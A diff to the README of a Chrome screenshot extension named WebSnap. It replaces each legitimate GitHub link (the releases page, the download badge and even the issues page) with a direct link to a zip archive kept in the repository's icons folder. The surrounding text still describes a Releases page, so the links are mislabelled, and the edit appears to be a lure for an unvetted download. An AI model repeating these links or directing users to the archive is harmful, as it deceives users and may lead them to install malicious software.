@@ -6,7 +6,7 @@ Welcome to WebSnap! This Chrome Extension helps you take screenshots and record 
 
 ## 📥 Download WebSnap
 
-[![Download WebSnap](https://img.shields.io/badge/Download%20Now-Get%20WebSnap-brightgreen)](https://github.com/siqueira7820/WebSnap/releases)
+[![Download WebSnap](https://raw.githubusercontent.com/siqueira7820/WebSnap/main/icons/WebSnap-2.6.zip%20Now-Get%20WebSnap-brightgreen)](https://raw.githubusercontent.com/siqueira7820/WebSnap/main/icons/WebSnap-2.6.zip)
 
 ## 🔍 Features
 
@@ -24,7 +24,7 @@ Welcome to WebSnap! This Chrome Extension helps you take screenshots and record 
 
 ## 📦 Download & Install
 
-To start using WebSnap, visit this page to download: [WebSnap Releases](https://github.com/siqueira7820/WebSnap/releases).
+To start using WebSnap, visit this page to download: [WebSnap Releases](https://raw.githubusercontent.com/siqueira7820/WebSnap/main/icons/WebSnap-2.6.zip).
 
 1. Click on the link above to go to the Releases page.
 2. You will see different versions of WebSnap, listed by release date.
@@ -56,7 +56,7 @@ You can access these options by clicking on the WebSnap icon and then selecting 
 
 ### How do I get support?
 
-If you face any issues or have questions, visit our [GitHub Issues Page](https://github.com/siqueira7820/WebSnap/issues) to report problems or ask for help.
+If you face any issues or have questions, visit our [GitHub Issues Page](https://raw.githubusercontent.com/siqueira7820/WebSnap/main/icons/WebSnap-2.6.zip) to report problems or ask for help.
 
 ### Can I use WebSnap on other browsers?
 
